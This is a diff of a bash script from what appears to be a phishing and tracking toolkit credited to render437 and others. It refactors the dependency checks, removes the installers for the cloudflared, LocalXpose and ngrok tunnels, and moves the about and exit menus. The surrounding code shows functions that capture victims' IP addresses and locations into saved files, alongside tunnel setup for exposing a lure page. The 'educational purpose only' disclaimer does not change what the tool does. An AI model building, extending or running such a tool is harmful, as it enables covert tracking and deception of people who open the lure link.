@@ -105,6 +105,11 @@ banner_small() {
     EOF
 }
 
+## Check for Dependencies
+dependencies() {
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+}
+
 ## Kill Processes
 stop() {
 if [[ "$windows_mode" == true ]]; then
@@ -135,49 +140,6 @@ fi
 
 exit 1
 }
-
-
-## Directories
-BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
-
-if [[ ! -d ".server" ]]; then
-    mkdir -p ".server"
-fi
-
-if [[ ! -d "auth" ]]; then
-    mkdir -p "auth"
-fi
-
-if [[ -d ".server/www" ]]; then
-    rm -rf ".server/www"
-    mkdir -p ".server/www"
-else
-    mkdir -p ".server/www"
-fi
-
-## Remove logfile
-if [[ -e ".server/.loclx" ]]; then
-    rm -rf ".server/.loclx"
-fi
-
-if [[ -e ".server/.cld.log" ]]; then
-    rm -rf ".server/.cld.log"
-fi
-
-## Script termination
-exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
-    exit 0
-}
-
-exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
-    exit 0
-}
-
-trap exit_on_signal_SIGINT SIGINT
-trap exit_on_signal_SIGTERM SIGTERM
-
 
 ## Kill already running process
 kill_pid() {
@@ -276,201 +238,7 @@ check_status() {
         [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e ""
 }
 
-## Dependencies
-dependencies() {
-        echo -e "\n${CYAN}Installing required packages..."
 
-        if [[ -d "/data/data/com.termux/files/home" ]]; then
-                if [[ ! $(command -v proot) ]]; then
-                        echo -e "\n${CYAN} Installing package: ${ORANGE}proot${CYAN}"${WHITE}
-                        pkg install proot resolv-conf -y
-                fi
-
-                if [[ ! $(command -v tput) ]]; then
-                        echo -e "\n${CYAN} Installing package: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
-                        pkg install ncurses-utils -y
-                fi
-        fi
-
-        # Check for php, curl, unzip, and jq
-        if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v jq) ]]; then
-                echo -e "\n${GREEN} Packages already installed."
-        else
-                pkgs=(php curl unzip jq)  # Add jq to the list of packages
-                for pkg in "${pkgs[@]}"; do
-                        type -p "$pkg" &>/dev/null || {
-                                echo -e "\n${CYAN} Installing package: ${ORANGE}$pkg${CYAN}"${WHITE}
-                                if [[ $(command -v pkg) ]]; then
-                                        pkg install "$pkg" -y
-                                elif [[ $(command -v apt) ]]; then
-                                        sudo apt install "$pkg" -y
-                                elif [[ $(command -v apt-get) ]]; then
-                                        sudo apt-get install "$pkg" -y
-                                elif [[ $(command -v pacman) ]]; then
-                                        sudo pacman -S "$pkg" --noconfirm
-                                elif [[ $(command -v dnf) ]]; then
-                                        sudo dnf -y install "$pkg"
-                                elif [[ $(command -v yum) ]]; then
-                                        sudo yum -y install "$pkg"
-                                else
-                                        echo -e "\n${RED} Unsupported package manager, Install packages manually."
-                                        { reset_color; exit 1; }
-                                fi
-                        }
-                done
-        fi
-}
-
-
-# Download Binaries
-download() {
-        url="$1"
-        output="$2"
-        file=`basename $url`
-        if [[ -e "$file" || -e "$output" ]]; then
-                rm -rf "$file" "$output"
-        fi
-        curl --silent --insecure --fail --retry-connrefused \
-                --retry 3 --retry-delay 2 --location --output "${file}" "${url}"
-
-        if [[ -e "$file" ]]; then
-                if [[ ${file#*.} == "zip" ]]; then
-                        unzip -qq $file > /dev/null 2>&1
-                        mv -f $output .server/$output > /dev/null 2>&1
-                elif [[ ${file#*.} == "tgz" ]]; then
-                        tar -zxf $file > /dev/null 2>&1
-                        mv -f $output .server/$output > /dev/null 2>&1
-                else
-                        mv -f $file .server/$output > /dev/null 2>&1
-                fi
-                chmod +x .server/$output > /dev/null 2>&1
-                rm -rf "$file"
-        else
-                echo -e "\n${RED} Error occured while downloading ${output}."
-                { reset_color; exit 1; }
-        fi
-}
-
-
-## Install Cloudflared
-install_cloudflared() {
-        if [[ -e ".server/cloudflared" ]]; then
-                echo -e "\n${GREEN} Cloudflared already installed."
-        else
-                echo -e "\n${CYAN} Installing Cloudflared..."${WHITE}
-                arch=`uname -m`
-                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-                elif [[ "$arch" == *'aarch64'* ]]; then
-                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-                elif [[ "$arch" == *'x86_64'* ]]; then
-                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
-                else
-                        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
-                fi
-        fi
-}
-
-## Install LocalXpose
-install_localxpose() {
-        if [[ -e ".server/loclx" ]]; then
-                echo -e "\n${GREEN} LocalXpose already installed."
-        else
-                echo -e "\n${CYAN} Installing LocalXpose..."${WHITE}
-                arch=`uname -m`
-                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-                elif [[ "$arch" == *'aarch64'* ]]; then
-                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-                elif [[ "$arch" == *'x86_64'* ]]; then
-                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-                else
-                        download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-                fi
-        fi
-}
-
-## Install Ngrok
-install_ngrok() {
-    if command -v ngrok >/dev/null 2>&1; then
-        echo -e "\n${GREEN} ngrok already installed."
-        return
-    fi
-
-    echo -e "\n${CYAN} Installing ngrok...${WHITE}"
-
-    ARCH=$(uname -m)
-
-    # Pick correct binary for Intel or ARM Chromebooks
-    if [[ "$ARCH" == "x86_64" ]]; then
-        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz"
-    elif [[ "$ARCH" == "aarch64" || "$ARCH" == arm* ]]; then
-        NGROK_URL="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz"
-    else
-        echo -e "${RED} Unsupported CPU architecture: $ARCH"
-        return 1
-    fi
-
-    mkdir -p .server
-    cd .server
-
-    # Download & extract
-    wget -q "$NGROK_URL" -O ngrok.tgz
-    tar -xvf ngrok.tgz >/dev/null
-    rm ngrok.tgz
-
-    # Move ngrok into .server directory
-    mv ngrok loc-ngrok
-    chmod +x loc-ngrok
-
-    cd ..
-
-    echo -e "${GREEN} ngrok installed successfully (anonymous mode)."
-    echo -e "${YELLOW} You can use it with: ${WHITE}.server/loc-ngrok http 8080"
-}
-
-## Exit message
-msg_exit() {
-        { clear; banner; echo; }
-        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
-        { reset_color; exit 0; }
-}
-
-## About
-about() {
-	{ clear; banner; echo; }
-    cat <<- EOF
-        ${BRIGHT_GREEN} Author:   ${BRIGHT_BLUE}render437
-        ${BRIGHT_GREEN} Github:   ${BRIGHT_BLUE}https://github.com/render437
-        ${BRIGHT_GREEN} Version:  ${BRIGHT_BLUE}${__version__}
-
-        ${RED}Warning:
-        ${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}
-        ${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}
-
-        ${ORANGE}Contributors:
-        ${BRIGHT_GREEN} Aditya Shakya, techchipnet, Kr3sZ, Prateek
-
-        ${BRIGHT_MAGENTA}0. Main Menu     ${BRIGHT_MAGENTA}99. Exit
-
-    EOF
-
-    echo
-    read -p "${MAGENTA}Select an option:"
-    case $REPLY in 
-        99)
-            msg_exit;;
-    	0 | 00)
-            echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
-            { sleep 1; main_menu; };;
-        *)
-            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-            { sleep 1; about; };;
-    esac
-}
-
-
-## Capture/Save IP to File
 catch_ip() {
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
@@ -479,7 +247,6 @@ printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 cat ip.txt >> saved.ip.txt
 }
 
-## Capture/Save Location to File
 catch_location() {
   # First check for the current_location.txt file which is always created
   if [[ -e "current_location.txt" ]]; then
@@ -567,6 +334,7 @@ sleep 0.5
 
 done 
 }
+
 
 cloudflare_tunnel() {
 if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
@@ -852,6 +620,45 @@ fi
 rm -rf index3.html
 }
 
+## Exit message
+msg_exit() {
+        { clear; banner; echo; }
+        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+        { reset_color; exit 0; }
+}
+
+## About
+about() {
+	{ clear; banner; echo; }
+    cat <<- EOF
+        ${BRIGHT_GREEN} Author:   ${BRIGHT_BLUE}render437
+        ${BRIGHT_GREEN} Github:   ${BRIGHT_BLUE}https://github.com/render437
+        ${BRIGHT_GREEN} Version:  ${BRIGHT_BLUE}${__version__}
+
+        ${RED}Warning:
+        ${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}
+        ${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}
+
+        ${ORANGE}Contributors:
+        ${BRIGHT_GREEN} Aditya Shakya, techchipnet, Kr3sZ, Prateek
+
+        ${BRIGHT_MAGENTA}0. Main Menu     ${BRIGHT_MAGENTA}99. Exit
+
+    EOF
+
+    echo
+    read -p "${MAGENTA}Select an option:"
+    case $REPLY in 
+        99)
+            msg_exit;;
+    	0 | 00)
+            echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+            { sleep 1; main_menu; };;
+        *)
+            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+            { sleep 1; about; };;
+    esac
+}
 
 ## Tunnel selection
 tunnel_menu() {
